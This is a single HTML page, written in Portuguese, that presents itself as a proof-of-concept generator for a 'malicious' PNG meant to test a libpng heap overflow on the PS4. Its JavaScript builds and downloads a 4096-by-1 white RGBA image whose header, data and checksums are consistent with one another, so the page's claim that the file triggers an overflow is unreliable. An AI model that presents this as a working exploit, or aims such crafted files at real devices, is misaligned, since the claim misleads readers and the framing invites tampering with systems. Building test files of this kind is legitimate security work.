<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gerador de PNG Malicioso (libpng PoC)</title>
    <style>
        body { font-family: sans-serif; background: #222; color: #eee; padding: 20px; text-align: center; }
        button { padding: 15px 30px; font-size: 18px; background: #d32f2f; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
        #log { margin-top: 20px; font-family: monospace; color: #888; text-align: left; background: #111; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>

    <h1>Gerador de PoC libpng</h1>
    <p>Este script cria uma imagem PNG com largura excessiva para testar Heap Overflow no PS4, sem precisar de Python.</p>
    
    <button onclick="gerarPNG()">Gerar e Baixar POC.PNG</button>
    <div id="log">Aguardando...</div>

<script>
    function log(msg) {
        document.getElementById('log').innerHTML += "<div>" + msg + "</div>";
    }

    // --- Tabelas e Funções Auxiliares para CRC32 e Adler32 ---
    var crcTable = [];
    for (var n = 0; n < 256; n++) {
        var c = n;
        for (var k = 0; k < 8; k++) {
            c = ((c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1));
        }
        crcTable[n] = c;
    }

    function crc32(buf) {
        var crc = 0 ^ (-1);
        for (var i = 0; i < buf.length; i++) {
            crc = (crc >>> 8) ^ crcTable[(crc ^ buf[i]) & 0xFF];
        }
        return (crc ^ (-1)) >>> 0;
    }

    function adler32(buf) {
        var a = 1, b = 0, L = buf.length;
        var i = 0;
        while (L > 0) {
            var n = 3800;
            if (n > L) n = L;
            L -= n;
            while (n--) {
                a = (a + buf[i++]) % 65521;
                b = (b + a) % 65521;
            }
        }
        return ((b << 16) | a) >>> 0;
    }

    function stringToBytes(str) {
        var bytes = new Uint8Array(str.length);
        for (var i = 0; i < str.length; i++) bytes[i] = str.charCodeAt(i);
        return bytes;
    }

    function int32ToBytes(num) {
        return new Uint8Array([
            (num >>> 24) & 0xff,
            (num >>> 16) & 0xff,
            (num >>> 8) & 0xff,
            (num) & 0xff
        ]);
    }

    // --- Função Principal de Geração ---
    function gerarPNG() {
        try {
            log("Iniciando construção do binário...");

            // 1. Assinatura PNG
            var signature = new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);

            // 2. Chunk IHDR (Cabeçalho)
            // Largura 0x1000 (4096), Altura 1, RGBA (Type 6), Depth 8
            var width = 0x1000; 
            var height = 1;
            var ihdrData = new Uint8Array(13);
            var view = new DataView(ihdrData.buffer);
            view.setUint32(0, width, false); // Big Endian
            view.setUint32(4, height, false);
            ihdrData[8] = 8; // Bit depth
            ihdrData[9] = 6; // Color type (RGBA)
            ihdrData[10] = 0; // Compression
            ihdrData[11] = 0; // Filter
            ihdrData[12] = 0; // Interlace

            var ihdrChunk = criarChunk("IHDR", ihdrData);

            // 3. Chunk IDAT (Dados)
            // Criando dados brutos: 1 byte filtro + (width * 4 bytes pixel)
            log("Gerando pixels brutos...");
            var rawLen = 1 + (width * 4);
            var rawData = new Uint8Array(rawLen);
            rawData[0] = 0; // Filter type 0
            rawData.fill(0xFF, 1); // Preenche pixels com branco (RGBA)

            // Criar bloco ZLIB "Stored" (sem compressão, mais fácil de fazer em JS puro)
            // Estrutura Zlib: Header (2 bytes) + Bloco Deflate (5 bytes + dados) + Adler32 (4 bytes)
            var zlibHeader = new Uint8Array([0x78, 0x01]); // No compression
            
            // Bloco Deflate não comprimido
            var len = rawData.length;
            var nlen = (~len) & 0xFFFF; // Complemento de um
            var deflateHeader = new Uint8Array([
                0x01, // Final block bit set, type 00 (stored)
                len & 0xff, (len >>> 8) & 0xff, // Length (Little Endian)
                nlen & 0xff, (nlen >>> 8) & 0xff // NLength
            ]);

            // Adler32 checksum
            var adler = adler32(rawData);
            var adlerBytes = int32ToBytes(adler);

            // Junta tudo no IDAT
            var idatPayload = new Uint8Array(zlibHeader.length + deflateHeader.length + rawData.length + adlerBytes.length);
            idatPayload.set(zlibHeader, 0);
            idatPayload.set(deflateHeader, zlibHeader.length);
            idatPayload.set(rawData, zlibHeader.length + deflateHeader.length);
            idatPayload.set(adlerBytes, zlibHeader.length + deflateHeader.length + rawData.length);

            var idatChunk = criarChunk("IDAT", idatPayload);

            // 4. Chunk IEND
            var iendChunk = criarChunk("IEND", new Uint8Array(0));

            // 5. Montar Arquivo Final
            var finalFile = new Uint8Array(signature.length + ihdrChunk.length + idatChunk.length + iendChunk.length);
            var offset = 0;
            finalFile.set(signature, offset); offset += signature.length;
            finalFile.set(ihdrChunk, offset); offset += ihdrChunk.length;
            finalFile.set(idatChunk, offset); offset += idatChunk.length;
            finalFile.set(iendChunk, offset);

            // 6. Criar Download
            var blob = new Blob([finalFile], {type: "image/png"});
            var url = URL.createObjectURL(blob);
            
            var a = document.createElement("a");
            a.href = url;
            a.download = "poc_libpng.png";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            log("Arquivo 'poc_libpng.png' gerado e baixado!");

        } catch(e) {
            log("Erro: " + e.message);
        }
    }

    function criarChunk(typeStr, data) {
        var type = stringToBytes(typeStr);
        var len = data.length;
        
        // Estrutura: Length (4) + Type (4) + Data (len) + CRC (4)
        var chunk = new Uint8Array(4 + 4 + len + 4);
        var view = new DataView(chunk.buffer);
        
        view.setUint32(0, len, false); // Length
        chunk.set(type, 4);            // Type
        chunk.set(data, 8);            // Data
        
        // Calcular CRC sobre Type + Data
        var crcData = new Uint8Array(4 + len);
        crcData.set(type, 0);
        crcData.set(data, 4);
        var crcVal = crc32(crcData);
        
        view.setUint32(8 + len, crcVal, false); // CRC
        
        return chunk;
    }
</script>

</body>
</html>
